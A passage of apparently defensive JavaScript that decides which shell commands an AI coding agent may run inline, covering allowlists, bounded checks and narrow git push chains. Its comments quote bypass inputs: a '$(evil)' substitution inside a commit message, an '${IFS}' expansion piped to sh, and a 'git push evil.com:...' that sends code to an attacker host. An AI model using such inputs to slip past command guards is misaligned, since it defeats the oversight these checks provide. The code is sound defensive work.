// or a substitution (those stay on their existing paths) may ride in a chain
// of otherwise-allowed segments.
function isPlainLightSegment(segment, command) {
  const seg = segment.trim();
  if (/\$\(|`|<\(|>\(|\$\{/.test(seg)) return false;
  if (/[()]/.test(neutralizeQuotedContents(seg))) return false;
  if (/^(?:!\s*)?(?:for|while|until|if|then|do|else|elif|case|select|function|time|\{)\b/.test(seg) || /^\{/.test(seg)) return false;
  if (/^(?:done|fi|esac|\})$/.test(seg)) return false;
  // Full classifier (shell -c / eval / wrapper / substitution unwrapping), so a
  // shell-wrapped heavy command cannot ride a chain; light inner stays light.
  try { return !isHeavyCommand(seg); } catch (_) { return false; }
}

function isTriviallySafeSegment(segment) {
  const verb = effectiveVerb(segment);
  return !!verb && VERIFY_TRIVIAL_VERBS.has(verb);
}

// Any write redirect (`>`, `>>`) or `tee` target that resolves outside the
// scratchpad/tmp disqualifies the whole command, `&>file`/`&>>file` included.
// `2>&1`/`>&2` fd-dup targets (no real path) are ignored.
function hasDisallowedWriteRedirect(segment, ctx) {
  const re = /(^|[^<>&])(&?>>?)\s*(\S+)/g;
  let m;
  while ((m = re.exec(segment))) {
    const target = m[3];
    if (/^&\d*$/.test(target)) continue;
    if (!isScratchpadOrTmpPath(target, ctx)) return true;
  }
  const verb = effectiveVerb(segment);
  if (verb === 'tee') {
    const tokens = segment.trim().split(/\s+/).filter(Boolean);
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i];
      if (t.startsWith('-')) continue;
      return !isScratchpadOrTmpPath(t, ctx);
    }
  }
  return false;
}

// isBoundedVerificationCommand(command) -> bool. See the header block above
// for the full rule. No command-substitution/`bash -c`/`eval` unwrapping is
// performed here on purpose — this exception is scoped to a literal, visible
// command line only; anything obfuscated through those never qualifies.
function isBoundedVerificationCommand(command, ctx) {
  if (typeof command !== 'string' || !command.trim()) return false;
  // An unquoted `#` starts a shell comment, which can hide the sink the
  // splitter thinks it saw (`x --check #| tail -5` runs unbounded). Refuse it.
  if (/#/.test(neutralizeQuotedContents(command))) return false;
  const { segments, delims } = splitSegmentsDetailed(command);
  if (!segments.length) return false;

  // Every PIPELINE (segments joined by `|`) that runs a qualifying check must
  // END in a bounded sink — `x --check && x --check | tail` leaves the first
  // check unbounded. A pipeline may only end at `;`, `&&`, `||`, a newline or
  // the end of the line; `&` (background) or any other delimiter disqualifies.
  const PIPELINE_ENDS = new Set([';', '&&', '||', '\n', 'end']);
  let sawQualifying = false;
  let pipelineHasCheck = false;
  for (let idx = 0; idx < segments.length; idx++) {
    const seg = segments[idx].trim();
    if (!seg) continue;
    // A `cd <path>` segment moves where every LATER relative path (script,
    // interpreter, clone dest) resolves — track it so `cd <repo> && <check>
    // | tail` is judged against the directory it actually runs in. A cd we
    // cannot resolve statically marks the cwd unknown (relative paths refuse).
    if (effectiveVerb(seg) === 'cd') {
      const cdTok = tokenizeQuoted(seg);
      const cdBase = (ctx.payload && typeof ctx.payload.cwd === 'string' && ctx.payload.cwd) || process.cwd();
      // Honoured ONLY as an unconditional step: every earlier delimiter and this
      // one are `&&`, so the cd ran (and succeeded) before anything after it. A cd
      // after `||`, in a pipe (subshell), or joined by `;` (may have failed, or be
      // a subshell) leaves the cwd unknown. The target is realpath'd: the shell's
      // physical cwd is what relative script paths resolve against.
      let cdCwd = null;
      if (cdTok.length === 2 && cdTok[0] === 'cd' && !/^-|[$`~*?[\]{}\\]/.test(cdTok[1]) &&
          delims[idx] === '&&' && delims.slice(0, idx).every((x) => x === '&&')) {
        try { cdCwd = fs.realpathSync(path.resolve(cdBase, cdTok[1])); } catch (_) { cdCwd = null; }
      }
      if (cdCwd) {
        ctx = Object.assign({}, ctx, { payload: Object.assign({}, ctx.payload, { cwd: cdCwd }) });
      } else {
        ctx = Object.assign({}, ctx, { cwdUnknown: true });
      }
    }
    if (hasDisallowedWriteRedirect(seg, ctx)) return false;
    let kind;
    // `2>&1` only merges stderr INTO the pipe (still bounded by the sink), so
    // the check shape is judged without it. Any other `>&` fd-dup (`>&2`,
    // `1>&2`) routes output AROUND the sink, so that segment never qualifies.
    const checkSeg = seg.replace(/(^|\s)2>&1(?=\s|$)/g, ' ').trim();
    if (!/>&/.test(neutralizeQuotedContents(checkSeg)) && isQualifyingSingleTargetCheck(checkSeg, ctx)) {
      kind = 'check';
      sawQualifying = true;
      pipelineHasCheck = true;
    } else if (isLooseSinkShape(seg)) {
      // A sink-shaped stage that breaks the closed grammar (file operand,
      // unknown flag) bounds nothing and is never a light segment either.
      if (!isBoundedSinkSegment(seg)) return false;
      const precedingDelim = idx > 0 ? delims[idx - 1] : null;
      if (precedingDelim !== '|') return false; // sequential (;/&&), not piped: not bounded
      kind = 'sink';
    } else if (isTriviallySafeSegment(seg)) {
      kind = 'trivial';
    } else if (idx > 0 && delims[idx - 1] === '|' && isReadOnlyFilterSegment(seg)) {
      // A read-only filter fed by a pipe: bounded only if the pipeline still
      // ends in a sink (enforced below: an unbounded tail stage returns false).
      kind = 'filter';
    } else if (!(idx > 0 && delims[idx - 1] === '|') && isPlainLightSegment(seg, command)) {
      // A non-heavy segment that starts its own pipeline/step (e.g. `git
      // check-ignore ...`, `echo X`) rides along: the chain is allowed iff
      // EVERY segment is individually allowed.
      kind = 'light';
    } else {
      return false;
    }
    const d = delims[idx];
    if (d === '|') continue;
    if (!PIPELINE_ENDS.has(d)) return false;
    if (pipelineHasCheck && kind !== 'sink') return false; // this pipeline's output is unbounded
    pipelineHasCheck = false;
  }
  return sawQualifying;
}

// ---------------------------------------------------------------------------
// Per-project command allowlist (owner-approved 2026-09-26). Lets a PROJECT
// declare its own sanctioned exact commands (e.g. its deploy script) that run
// inline in the MAIN THREAD ONLY, even though they classify heavy above — a
// project's own rule may require its deploy to never be delegated to a
// subagent (a subagent once reshaped one). The project opts in itself, by
// committing `<repo-toplevel>/.anti-hall/command-allow.json` — anti-hall
// ships with nothing allowed anywhere (default empty list == no behavior
// change for a repo that never created this file). Gated by
// guards.projectCommandAllow (default true); NEVER applied outside
// isCoordinator(payload) — see the call site in main().
//
// Reuses splitSegmentsDetailed — no new parser (a recurring bug class here is
// a second/third hand-rolled segment splitter).
// ---------------------------------------------------------------------------

// loadProjectCommandAllowPatterns(cwd) -> the VALID patterns of this repo's
// allowlist, and only when the user TRUSTED that exact file content
// (lib/command-allow.js: ~/.anti-hall/trusted-command-allow.json maps the
// repo realpath to the sha256 of the file bytes; any edit -> untrusted until
// `node scripts/settings.js trust-command-allow --confirmed` re-trusts it).
// A pattern is valid per validatePattern: literal `^` + a literal command
// word, closing `$`, no unbounded wildcard such as `.*`/`.+`, no top-level
// `|` — `^.*$` is NOT an anchored rule, it allows everything. Symlinked,
// missing, malformed or untrusted config -> [] (no behavior change);
// doctor.js reports each case.
function loadProjectCommandAllowPatterns(cwd) {
  const lib = require('./lib/command-allow.js');
  const testHomeGuard = require('../companion/lib/test-home-guard.js');
  return lib.loadTrustedPatterns(cwd, testHomeGuard.resolveHome(undefined, process.env));
}

// hasUnquotedRedirectChar(segment) -> true if a bare (unquoted) '>' or '<'
// appears anywhere — the per-project allowlist bans ANY redirect regardless
// of destination (unlike the narrow-allow carve-out above, which only cares
// about the destination path), since the whole point is running the
// project's declared command EXACTLY, never a redirected variant of it.
function hasUnquotedRedirectChar(segment) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    const c2 = i + 1 < segment.length ? segment[i + 1] : '';
    if (inSingle) { if (c === "'") inSingle = false; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { i++; continue; }
      if (c === '"') inDouble = false;
      continue;
    }
    if (c === '\\' && c2) { i++; continue; } // outside quotes: escaped char is literal
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
    if (c === '>' || c === '<') return true;
  }
  return false;
}

// isSingleUnbrokenSegment(command) -> the command splits into exactly ONE
// logical segment via splitSegmentsDetailed, terminated by 'end' (i.e. no
// ';'/'&&'/'||'/'|'/'&'/newline/heredoc/subshell-or-group/command-substitution
// boundary was found outside quotes anywhere in the line) — this is what
// rules out chaining, pipes, subshells, backticks and `$( )` in one check,
// reusing the guard's own canonical splitter rather than a second parser.
function isSingleUnbrokenSegment(command) {
  const { segments, delims } = splitSegmentsDetailed(command);
  if (segments.length !== 1) return false;
  return delims[0] === 'end';
}

// matchedProjectCommandAllowPattern(command, cwd) -> the matching pattern
// string, or null. ALL of these must hold:
//   1. the config resolves at least one valid, TRUSTED pattern for this repo;
//   2. the WHOLE command is exactly one segment (no chaining/pipes/subshells/
//      command substitution — see isSingleUnbrokenSegment);
//   3. no unquoted redirect character anywhere in the command;
//   4. no `$`, backtick, backslash or `<(`/`>(` anywhere, quoted or not
//      (hasShellExpansionAnywhere) — the shell would rewrite the text the
//      pattern matched;
//   5. the WHOLE (trimmed) command line matches one whole pattern exactly.
function matchedProjectCommandAllowPattern(command, cwd) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const patterns = loadProjectCommandAllowPatterns(cwd);
  if (!patterns.length) return null;
  if (!isSingleUnbrokenSegment(command)) return null;
  if (hasUnquotedRedirectChar(command)) return null;
  if (hasShellExpansionAnywhere(command)) return null;
  const trimmed = command.trim();
  for (const p of patterns) {
    let re;
    try { re = new RegExp(p); } catch (_) { continue; }
    if (re.test(trimmed)) return p;
  }
  return null;
}

// redactAuditCommand(command) -> the command with secret-looking values
// masked before it is logged: a value after a secret-named flag
// (`--token X`, `--password=X`, `-p` is NOT matched — too generic), then
// jev-assist's scrubSecrets (key=/token= assignments, known key prefixes,
// Bearer/JWT/PEM/URL credentials, long base64/hex runs).
function redactAuditCommand(command) {
  let s = String(command || '');
  s = s.replace(/(^|\s)(--?[A-Za-z0-9_-]*(?:token|password|passwd|secret|apikey|auth|credential|key)[A-Za-z0-9_-]*)(\s+|=)(\S+)/gi, '$1$2$3[REDACTED]');
  try {
    s = require('./lib/jev-assist.js').scrubSecrets(s);
  } catch (_) {
    // scrubber unavailable: the flag masking above still applied.
  }
  return s;
}

// appendProjectCommandAllowAudit({cwd, repo, pattern, command}) -> best-effort,
// ONE ndjson line per allowed run, to ~/.anti-hall/logs/command-allow.ndjson.
// Uses the canonical resolveHome() helper (see test-home-guard.js and
// tests/hygiene/homedir-call-site-ratchet.test.js) so a test with an isolated
// HOME never touches the real developer machine. The ~/.anti-hall and logs
// dirs must not be symlinks (lstat) and the file is opened O_NOFOLLOW, so a
// planted symlink can never redirect the write; the logged command is
// redacted (redactAuditCommand). Fully fail-open: a write failure never
// blocks or un-allows the command that already passed.
function appendProjectCommandAllowAudit(entry) {
  let fd = null;
  try {
    const testHomeGuard = require('../companion/lib/test-home-guard.js');
    const home = testHomeGuard.resolveHome(undefined, process.env);
    const ahDir = path.join(home, '.anti-hall');
    const logDir = path.join(ahDir, 'logs');
    fs.mkdirSync(logDir, { recursive: true, mode: 0o700 });
    for (const d of [ahDir, logDir]) {
      const st = fs.lstatSync(d);
      if (st.isSymbolicLink() || !st.isDirectory()) return;
    }
    const line = JSON.stringify({
      ts: new Date().toISOString(),
      cwd: entry.cwd || '',
      repo: entry.repo || '',
      pattern: entry.pattern || '',
      command: redactAuditCommand(entry.command || ''),
    }) + '\n';
    const c = fs.constants;
    fd = fs.openSync(path.join(logDir, 'command-allow.ndjson'),
      c.O_WRONLY | c.O_APPEND | c.O_CREAT | (c.O_NOFOLLOW || 0), 0o600);
    if (!fs.fstatSync(fd).isFile()) return;
    fs.writeSync(fd, line);
  } catch (_) {
    // fail-open: audit logging never blocks or un-allows an already-allowed command.
  } finally {
    if (fd !== null) { try { fs.closeSync(fd); } catch (_) { /* ignore */ } }
  }
}

// ---------------------------------------------------------------------------
// "Allow plain push" carve-out (owner-approved 2026-09-26, widened
// 2026-09-26 on a field repro). Lets the MAIN THREAD run `git add …`, `git
// commit …`, and a plain `git push [remote] [ref]` — plus `&&`/`;` chains
// made up ONLY of those three — inline, even though a `git push` segment is
// classified heavy above (HEAVY_PATTERNS). git-guard.js keeps its own
// independent force-push and AI-credit checks; this carve-out never touches
// or duplicates those.
//
// A push segment qualifies ONLY as the bare shape `git push [-q|--quiet|-u|
// --set-upstream] [remote] [ref]` (`-u` needs an explicit remote AND ref) — no other flags, no `+refspec`, no `src:dst` (a `:` or
// leading `+`/`-` token — other than the one recognized `-q`/`--quiet` slot
// — disqualifies the whole chain, which then falls through to the ordinary
// heavy-command block, i.e. no behavior CHANGE for --force/--mirror/
// --delete/-d/--all/--tags/a foreign dst — they are exactly as blocked as
// before, including `-q` combined with any of them: the quiet slot is
// exactly one token, in exactly that position). A given `remote` must be a
// configured remote NAME (`git -C <cwd> remote`; a path or URL-ish token
// never qualifies, unresolvable fails closed). A given `ref` must be `HEAD`
// or the CURRENT branch (`git -C <cwd> symbolic-ref --short HEAD`) — a push
// to any other branch never qualifies; the resolver failing (detached HEAD,
// not a repo, spawn error) fails CLOSED (does not qualify).
//
// Widened shapes (field repro: `cd <repo> && git add a b && git commit -q -m
// "fix: x" && git push -q origin main && git log --oneline -1` was blocked
// as heavy-pattern — none of the three gaps below existed yet):
//   (a) `-q`/`--quiet` on push (add/commit already accepted any flags via a
//       prefix match, so they needed no change).
//   (b) ONE optional LEADING `cd <path>` segment — allowed only when
//       `path.resolve(payload cwd, path)` REALPATHs to the payload cwd's own
//       repo toplevel, or a directory inside it (never a different repo, a
//       symlink escape, or an unresolvable path — fails CLOSED). All branch/
//       remote resolution for the rest of the chain then uses that resolved
//       directory, not the payload cwd.
//   (c) Optional TRAILING read-only segments, and ONLY after at least one
//       push segment has already appeared in the chain: `git log --oneline
//       [-N]`, `git status [--short|-s]`, `git show --stat [-N|HEAD]`. No
//       other git subcommand, no flags outside this exact shape.
//   (d) Field repro (peer sweep, 0.115.2): `git push origin
//       HEAD:refs/heads/<branch> 2>&1 | tail -2` was blocked by three
//       separate checks. Now accepted, still only for the CURRENT branch:
//       a `SRC:DST` ref whose SRC is `HEAD`/the current branch and whose DST
//       is the current branch (optionally `refs/heads/`-qualified) - the same
//       destination as the approved bare form; a trailing `2>&1` on any chain
//       segment; and ONE final `| tail [-n] N` / `| head [-n] N` output filter.
//       A foreign DST, a delete (`:dst`), `+` force and every flag stay
//       exactly as blocked as before.
//   (e) ONE final `> <file>` / `>> <file>` redirect (optionally with `2>&1`)
//       whose target is inside THIS session's own scratchpad (a bounded sink,
//       the same as `| tail`; the output goes to a file, not the main thread).
//       NOT the generic tmp roots, a `$`/glob/`~` target, or any other redirect
//       form — those keep blocking.
// ---------------------------------------------------------------------------

// A bare remote/ref token: no leading '-' or '+' (rules out every flag and
// force-refspec form), and no ':' anywhere (rules out `src:dst`/delete
// refspecs) — enforced by the character class simply never including ':'.
// The one optional flag slot right after `push` matches ONLY `-q`/`--quiet`/
// `-u`/`--set-upstream` verbatim (not a character class), so `--force`/`-f`/anything else there
// still fails the whole regex, same as before this carve-out was widened.
const PLAIN_PUSH_SEGMENT_RE = /^git\s+push(?:\s+(-q|--quiet|-u|--set-upstream))?(?:\s+((?![-+])[A-Za-z0-9_.\/-]+))?(?:\s+((?![-+])[A-Za-z0-9_.\/-]+(?::[A-Za-z0-9_.\/-]+)?))?\s*$/;
// (d) The one accepted trailing output filter, piped from the last segment.
const PLAIN_OUTPUT_FILTER_RE = /^(?:tail|head)(?:\s+(?:-n\s*)?-?\d+)?\s*$/;
// (d) A trailing `2>&1` (stderr merged into stdout) - no other redirect.
const TRAILING_STDERR_MERGE_RE = /\s+2>&1\s*$/;

// Trailing read-only segments (c) — only ever consulted AFTER a push segment
// has already appeared in the chain (enforced in isAllowedPlainPushChain,
// not here). Each is an exact, narrow shape: no other flags, no redirects
// (redirect/substitution characters are already rejected by
// classifyPlainGitChainSegment before these run).
const PLAIN_LOG_SEGMENT_RE = /^git\s+log\s+--oneline(?:\s+-\d+)?\s*$/;
const PLAIN_STATUS_SEGMENT_RE = /^git\s+status(?:\s+(?:--short|-s))?\s*$/;
const PLAIN_SHOW_SEGMENT_RE = /^git\s+show\s+--stat(?:\s+(?:-\d+|HEAD))?\s*$/;
// Post-push verification reads: `git ls-remote [--heads] <remote> [<ref>]` and
// `git rev-parse [--short] <HEAD|ref>`. Bare tokens only (no flag other than
// the one listed, no `:`/`+`); the ls-remote remote must be a configured name.
const PLAIN_LSREMOTE_SEGMENT_RE = /^git\s+ls-remote(?:\s+--heads)?\s+((?![-+])[A-Za-z0-9_.\/-]+)(?:\s+(?![-+])[A-Za-z0-9_.\/-]+)?\s*$/;
const PLAIN_REVPARSE_SEGMENT_RE = /^git\s+rev-parse(?:\s+--short)?\s+(?![-+])[A-Za-z0-9_.\/-]+\s*$/;

// hasSubstitutionOutsideSingleQuotes(segment) -> true if a `` ` `` or `$(`
// appears anywhere the shell would actually EXPAND it — i.e. outside single
// quotes (double quotes still expand command substitution; only single
// quotes make it literal). This is what keeps `git commit -m "$(evil)"` out
// of the allow-chain even though it is still a single, unbroken `git commit`
// segment by the plain chain-delimiter check alone.
function hasSubstitutionOutsideSingleQuotes(segment) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    const c2 = i + 1 < segment.length ? segment[i + 1] : '';
    if (inSingle) { if (c === "'") inSingle = false; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { i++; continue; }
      if (c === '"') { inDouble = false; continue; }
      if (c === '`') return true;
      if (c === '$' && c2 === '(') return true;
      continue;
    }
    if (c === '\\' && c2) { i++; continue; } // outside quotes: escaped char is literal
    if (c === "'") { inSingle = true; continue; }
    if (c === '"') { inDouble = true; continue; }
    if (c === '`') return true;
    if (c === '$' && c2 === '(') return true;
  }
  return false;
}

// hasShellExpansionAnywhere(command) -> true if the command carries ANY
// expansion/escape character, quoted or not: `$` (covers $( ), ${ }, $VAR,
// $IFS), a backtick, a backslash, or a process substitution `<(`/`>(`. The
// per-project allowlist matches command TEXT against a regex, so anything the
// shell would rewrite before running it (inside double quotes too —
// `"$(npm${IFS}test|sh)"` satisfied `\S+`) must never reach the match.
// Extends hasSubstitutionOutsideSingleQuotes' coverage to every quote context.
function hasShellExpansionAnywhere(command) {
  if (hasSubstitutionOutsideSingleQuotes(command)) return true;
  return /[$`\\]|[<>]\(/.test(command);
}

// classifyPlainGitChainSegment(segment) -> {kind:'add'|'commit'} |
// {kind:'push', remote, ref} | {kind:'log'|'status'|'show'} | null.
// `remote`/`ref` are the (post-quiet-flag) first/second bare tokens of a
// plain push (null when omitted).
function classifyPlainGitChainSegment(segment) {
  const trimmed = segment.trim().replace(TRAILING_STDERR_MERGE_RE, '');
  if (hasUnquotedRedirectChar(trimmed)) return null;
  if (hasSubstitutionOutsideSingleQuotes(trimmed)) return null;
  if (/^git\s+add\b/i.test(trimmed)) return { kind: 'add' };
  if (/^git\s+commit\b/i.test(trimmed)) return { kind: 'commit' };
  const m = trimmed.match(PLAIN_PUSH_SEGMENT_RE);
  if (m) {
    // A1-6: with NO explicit remote token, git parses the sole positional
    // argument as the <repository> (remote), not a refspec — real git syntax
    // is `git push [<repository> [<refspec>...]]`, so a lone `SRC:DST`-shaped
    // token is only ever a refspec when an explicit remote token precedes it.
    // A colon-bearing token with no remote group is a scp-like remote URL
    // (`host:path`) to git, however ref-shaped it looks (e.g. a branch named
    // to look like a host: `git push evil.com:refs/heads/evil.com` passes
    // isPlainPushRefAllowed's SRC===DST===<current branch> check while git
    // itself pushes over ssh to host `evil.com`). Reject the segment outright
    // rather than let isPlainPushRefAllowed's ref-shaped check vouch for it.
    if (m[3] && m[3].indexOf(':') !== -1 && !m[2]) return null;
    // `-u`/`--set-upstream` is the ONLY upstream flag accepted, and only with
    // BOTH an explicit remote and an explicit ref (`git push -u origin
    // <branch>`) - a bare `git push -u`/`-u origin` never qualifies. Remote/ref
    // are then vetted exactly like the plain form. It shares the single flag
    // slot, so `-q -u`/`-u -q`/`-uf` never match the regex.
    if ((m[1] === '-u' || m[1] === '--set-upstream') && !(m[2] && m[3])) return null;
    return { kind: 'push', remote: m[2] || null, ref: m[3] || null };
  }
  if (PLAIN_LOG_SEGMENT_RE.test(trimmed)) return { kind: 'log' };
  if (PLAIN_STATUS_SEGMENT_RE.test(trimmed)) return { kind: 'status' };
  if (PLAIN_SHOW_SEGMENT_RE.test(trimmed)) return { kind: 'show' };
  const lr = trimmed.match(PLAIN_LSREMOTE_SEGMENT_RE);
  if (lr) return { kind: 'lsremote', remote: lr[1] };
  if (PLAIN_REVPARSE_SEGMENT_RE.test(trimmed)) return { kind: 'revparse' };
  return null;
}

// classifyLeadingCdSegment(segment) -> the raw path argument string, or null
// if this segment is not a bare, single-argument `cd <path>` (no flags, no
// `-`/`~` shortcuts, no quoting tricks beyond a single simple token — the
// realpath/toplevel check below is the actual security boundary, this just
// rules out anything that is not obviously one plain path argument).
function classifyLeadingCdSegment(segment) {
  const trimmed = segment.trim();
  if (hasUnquotedRedirectChar(trimmed)) return null;
  if (hasSubstitutionOutsideSingleQuotes(trimmed)) return null;
  if (hasShellExpansionAnywhere(trimmed)) return null;
  const tokens = tokenizeQuoted(trimmed);
  if (tokens.length !== 2 || tokens[0] !== 'cd') return null;
  const p = tokens[1];
  if (!p || p === '-' || p.startsWith('~')) return null;
  return p;
}

// gitCommonDirRealpath(dir) -> realpath of the actual, physical .git STORE
// (never the worktree checkout path) for `dir`, via the canonical identity
// resolver (companion/lib/identity.js resolveContext — the ONE "where am I"
// resolver; see tests/hygiene/identity-single-resolver.test.js). Two
// directories share this iff they are the SAME repository: the main
// worktree and every one of its `git worktree add` linked worktrees all
// resolve to the identical common dir, while a git SUBMODULE or any
// independently-`git init`'d nested repo — even though it lives physically
// inside the outer repo's directory tree — has its OWN, different common
// dir. This is the actual repo-IDENTITY check (a path containment check is
// not one). Null (fails closed) on any resolution failure.
function gitCommonDirRealpath(dir) {
  try {
    const info = require('../companion/lib/identity.js').rawGitInfo(dir);
    return info && info.commonDir ? info.commonDir : null;
  } catch (_) {
    return null;
  }
}

// resolvedLeadingCdTarget(rawPath, payloadCwd) -> realpath of the target
// directory, or null (fails CLOSED) unless it is a git repository sharing
// the SAME git-common-dir as the payload cwd's own repo.
//
// SECURITY FIX (field repro, 2026-09-26): the original check only verified
// the target was a path INSIDE the payload cwd's toplevel directory tree —
// `cd realsub && git add z && git commit -m x && git push origin subbr`
// qualified for the carve-out whenever `realsub` merely lived under the
// outer repo's directory, even when `realsub` was a git SUBMODULE or any
// other nested repo with its OWN .git/remote/branch: branch/remote
// resolution then ran against the WRONG repository entirely, validating the
// push against a repo/branch/remote the operator never confirmed. Path
// containment is not repo identity; git-common-dir equality is (worktrees of
// one repo share it, a submodule/nested repo never does — see
// gitCommonDirRealpath's header). Fails CLOSED on any resolution error, an
// unresolvable target, or a target whose own toplevel cannot be resolved.
function resolvedLeadingCdTarget(rawPath, payloadCwd) {
  try {
    const cwd = payloadCwd || process.cwd();
    const target = fs.realpathSync(path.resolve(cwd, rawPath));
    const payloadCommonDir = gitCommonDirRealpath(cwd);
    if (!payloadCommonDir) return null;
    const targetInfo = require('../companion/lib/identity.js').rawGitInfo(target);
    if (!targetInfo || !targetInfo.commonDir) return null;
    if (targetInfo.commonDir !== payloadCommonDir) return null;
    // Defensive sanity check (git-common-dir equality above is already the
    // security boundary): the target must itself resolve to a real toplevel.
    if (!targetInfo.toplevel) return null;
    try { fs.realpathSync(targetInfo.toplevel); } catch (_) { return null; }
    return target;
  } catch (_) {
    return null; // fail closed: unresolvable path, not a repo, etc.
  }
}

// currentBranchName(cwd) -> the checked-out branch name, or null (detached
// HEAD, not a repo, spawn failure/timeout — every failure mode reads as
// null, and the caller treats null as FAIL CLOSED, never as a pass).
function currentBranchName(cwd) {
  try {
    const { spawnSync } = require('child_process');
    const res = spawnSync('git', ['-C', cwd || process.cwd(), 'symbolic-ref', '--short', 'HEAD'], {
      encoding: 'utf8', timeout: 5000,
    });
    if (!res || res.status !== 0) return null;
    const name = String(res.stdout || '').trim();
    return name || null;
  } catch (_) {
    return null;
  }
}

// configuredRemotes(cwd) -> array of `git -C <cwd> remote` names, or null
// on any failure (not a repo, spawn error/timeout) — the caller treats null
// as FAIL CLOSED.
function configuredRemotes(cwd) {
  try {
    const { spawnSync } = require('child_process');
    const res = spawnSync('git', ['-C', cwd || process.cwd(), 'remote'], { encoding: 'utf8', timeout: 5000 });
    if (!res || res.status !== 0) return null;
    return String(res.stdout || '').split('\n').map((l) => l.trim()).filter(Boolean);
  } catch (_) {
    return null;
  }
}

// isPlainPushRemoteAllowed(remote, cwd) -> bool. The remote token must be a
// CONFIGURED remote name — a path (`../other-repo`) or URL-ish token
// (`host/evil`) is a push destination git accepts directly and never
// qualifies. Unresolvable remotes fail closed.
function isPlainPushRemoteAllowed(remote, cwd) {
  if (!remote) return true;
  const remotes = configuredRemotes(cwd);
  if (!remotes) return false;
  return remotes.includes(remote);
}

// isPlainPushRefAllowed(ref, cwd) -> bool. No ref given, or `HEAD`, always
// qualifies; any other ref must equal the ACTUAL current branch — resolved
// fresh per call (never trusted from the command text itself).
function isPlainPushRefAllowed(ref, cwd) {
  if (!ref) return true;
  if (ref === 'HEAD') return true;
  const branch = currentBranchName(cwd);
  if (!branch) return false; // fail closed: could not resolve the current branch
  const colon = ref.indexOf(':');
  if (colon === -1) return ref === branch;
  // (d) `SRC:DST`: SRC is HEAD or the current branch, DST is the current
  // branch (bare or refs/heads/-qualified). Anything else never qualifies.
  const src = ref.slice(0, colon);
  const dst = ref.slice(colon + 1).replace(/^refs\/heads\//, '');
  if (dst !== branch) return false;
  if (src === 'HEAD' || src === branch) return true;
  // SRC may also be the checked-out commit spelled as its (abbreviated) sha —
  // the same commit `HEAD` names, so the push is still "my current branch".
  // Resolved by git itself in the effective cwd (`rev-parse --verify --quiet
  // <src>^{commit}`), which applies git's own rule that a ref NAME wins over an
  // abbreviated sha: a tag/branch named like a sha on another commit resolves
  // to THAT commit, differs from HEAD and refuses. Ambiguous/unknown/any
  // resolve failure refuses.
  if (/^[0-9a-f]{7,40}$/i.test(src)) {
    try {
      const { spawnSync } = require('child_process');
      const resolve = (rev) => {
        const res = spawnSync('git', ['-C', cwd || process.cwd(), 'rev-parse', '--verify', '--quiet', rev + '^{commit}'],
          { encoding: 'utf8', timeout: 5000 });
        return res && res.status === 0 ? String(res.stdout || '').trim().toLowerCase() : '';
      };
      const head = resolve('HEAD');
      return !!head && resolve(src) === head;
    } catch (_) { return false; }
  }
  return false;
}

// sinkPathHasSymlink(target, payload) -> true when the lexical target path, or
// any EXISTING component below the own scratchpad root, is a symlink (dangling
// included): a redirect through it writes wherever the link points, and
// realpath containment cannot see a dangling link. Not under a lexical own
// root -> true (refuse). A non-existing leaf in a real dir is fine.
function sinkPathHasSymlink(target, payload) {
  try {
    const base = (payload && typeof payload.cwd === 'string' && payload.cwd) || process.cwd();
    const abs = path.resolve(base, target.replace(/^['"]|['"]$/g, ''));
    const sp = require('./lib/scratchpad.js');
    const root = sp.ownScratchpadDirs(payload).find((r) => abs.startsWith(r + path.sep));
    if (!root) return true;
    let cur = root;
    for (const part of path.relative(root, abs).split(path.sep)) {
      cur = path.join(cur, part);
      let st;
      try { st = fs.lstatSync(cur); } catch (e) {
        if (e && e.code === 'ENOENT') return false; // rest does not exist yet
        return true;
      }
      if (st.isSymbolicLink()) return true;
    }
    return false;
  } catch (_) { return true; }
}

// isAllowedPlainPushChain(command, cwd) -> bool. See the header block above.
function isAllowedPlainPushChain(command, cwd, payload) {
  if (typeof command !== 'string' || !command.trim()) return false;
  // (e) strip ONE final own-scratchpad file redirect (keeping a trailing `2>&1`).
  // `[ \t]` (not `\s`): a newline before `>` makes it a SEPARATE command, so
  // a plain push, newline, then `> f` is not one push with a sink.
  const sink = command.match(/[ \t]+>>?[ \t]*([^\s<>&|;'"`$\\]+)((?:[ \t]+2>&1)?)[ \t]*$/);
  if (sink && payload && isScratchpadOrTmpPath(sink[1], { payload, ownOnly: true }) &&
      !sinkPathHasSymlink(sink[1], payload)) {
    command = command.slice(0, sink.index) + sink[2];
  }
  const split = splitSegmentsDetailed(command);
  const segments = split.segments.slice();
  const delims = split.delims.slice();
  if (!segments.length) return false;
  // (d) ONE final `| tail -N` / `| head -N` output filter: drop it and treat
  // the segment it reads from as the end of the chain.
  if (segments.length >= 2 && delims[delims.length - 1] === 'end' && delims[delims.length - 2] === '|' &&
      PLAIN_OUTPUT_FILTER_RE.test(segments[segments.length - 1].trim())) {
    segments.pop();
    delims.pop();
    delims[delims.length - 1] = 'end';
  }
  // (d2) a `| tail/head -N` output filter piped from a PLAIN PUSH segment in
  // the MIDDLE of the chain (`git push origin b 2>&1 | tail -3; git ls-remote …`):
  // drop the filter and let the push segment carry the following delimiter.
  for (let i = segments.length - 2; i >= 0; i--) {
    if (delims[i] !== '|' || !PLAIN_OUTPUT_FILTER_RE.test(segments[i + 1].trim())) continue;
    const prev = classifyPlainGitChainSegment(segments[i].trim());
    if (!prev || prev.kind !== 'push') continue;
    segments.splice(i + 1, 1);
    delims.splice(i, 1);
  }
  // Every delimiter between segments must be '&&' or ';' — a pipe, '||',
  // background '&', newline, heredoc, subshell/group, or command
  // substitution boundary disqualifies the WHOLE chain. The final delimiter
  // must be 'end' (nothing trails the last segment).
  for (let i = 0; i < delims.length; i++) {
    const isLast = i === delims.length - 1;
    if (isLast) {
      if (delims[i] !== 'end') return false;
    } else if (delims[i] !== '&&' && delims[i] !== ';') {
      return false;
    }
  }
  let rest = segments;
  // (b) ONE optional leading `cd <path>` — only the FIRST segment may be a
  // cd, and only when it resolves (realpath) to the payload cwd's own repo
  // toplevel or a directory inside it. All git resolution below then uses
  // that resolved directory. Fails CLOSED (whole chain disqualified) on any
